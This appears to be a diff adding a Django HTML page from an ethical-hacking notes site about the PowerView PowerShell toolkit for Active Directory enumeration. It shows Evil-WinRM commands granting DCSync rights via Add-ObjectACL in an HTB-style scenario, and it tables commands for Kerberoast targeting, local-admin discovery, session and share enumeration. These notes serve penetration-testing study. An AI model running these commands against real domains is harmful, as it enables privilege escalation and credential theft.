@@ -1,0 +1,89 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>What is <code>PowerView.ps1</code>?</h1>
+    <p class="common">PowerView is a PowerShell toolkit for Active Directory (AD) enumeration and situational awareness. It helps you map users, computers, groups, ACLs, sessions, trusts, shares, and privilege relationships—so you can plan lateral movement and privilege escalation in Windows domains.</p>
+
+    <h1>Prepare</h1>
+    <div class="code-box"><pre><code>/utils/Windows/PowerView.ps1
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> Import-Module .\PowerView.ps1</code></pre></div>
+
+    <h1>Use case</h1>
+    <h2 class="blue">You have user obtains WriteDACL privilege</h2>
+    <p class="common">Background : Group "<code>EXCHANGE WINDOWS PERMISSION</code>" has WriteDACL permission. Also I had user who is the member of the group.</p>
+    <div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>$pass = convertto-securestring 'test123!' -asplain -force</u>
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>$cred = new-object system.management.automation.pscredential('htb\me', $pass)</u>
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>Import-Module .\PowerView.ps1</u>
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>Add-ObjectACL -PrincipalIdentity me -Credential $cred -Rights DCSync</u></code></pre></div>
+
+
+
+<h3>PowerView common commands</h3>
+<table border="1" cellpadding="6" cellspacing="0">
+    <thead>
+        <tr>
+            <th>Command</th>
+            <th>Explain</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><code>Add-ObjectACL</code></td>
+            <td>Add-DomainObjectAcl (aka Add-ObjectAcl in older PowerView) edits an AD objects DACL to grant chosen rights to a principal. You can add <code>GenericAll</code>, <code>ResetPassword</code>, <code>WriteDacl</code>, or property-specific rights—enabling escalations like password resets, group membership changes, DCSync, or RBCD.</td>
+        </tr>
+        <tr>
+            <td><code>Get-NetDomain</code></td>
+            <td>Returns basic domain info (name, SID, domain controllers) — equivalent to Get-CurrentDomain.</td>
+        </tr>
+        <tr>
+            <td><code>Get-NetUser &lt;Username&gt; | select memberof</code></td>
+            <td>Shows the group memberships for the specified user.</td>
+        </tr>
+        <tr>
+            <td><code>Get-NetUser -SPN | select samaccountname,serviceprincipalname</code></td>
+            <td>Lists accounts with registered SPNs (Kerberoast targets) and their SPN values.</td>
+        </tr>
+        <tr>
+            <td><code>Get-NetGroup &lt;Groupname&gt; | select member</code></td>
+            <td>Displays members of the named group.</td>
+        </tr>
+        <tr>
+            <td><code>Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion</code></td>
+            <td>Enumerates computer objects and shows hostname and OS/version fields.</td>
+        </tr>
+        <tr>
+            <td><code>Find-LocalAdminAccess</code></td>
+            <td>Scans domain hosts to find machines where the current user is a local administrator.</td>
+        </tr>
+        <tr>
+            <td><code>Get-NetSession -ComputerName &lt;name&gt; -Verbose</code></td>
+            <td>Lists active SMB/RPC sessions on the target computer (who is connected, from where).</td>
+        </tr>
+        <tr>
+            <td><code>Get-ObjectAcl -Identity &lt;object&gt;</code></td>
+            <td>Enumerates ACLs/ACEs for the object (shows permissions tied to principals).</td>
+        </tr>
+        <tr>
+            <td><code>Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier, ActiveDirectoryRights</code></td>
+            <td>Finds objects where "Management Department" has GenericAll rights and lists the SID and rights.</td>
+        </tr>
+        <tr>
+            <td><code>Convert-SidToName &lt;SID&gt;</code></td>
+            <td>Converts a SID to its human-readable account name.</td>
+        </tr>
+        <tr>
+            <td><code>Find-DomainShare</code></td>
+            <td>Discovers domain shares and reports accessible/writable shares across hosts.</td>
+        </tr>
+    </tbody>
+</table>
+
+</body>
+</html>
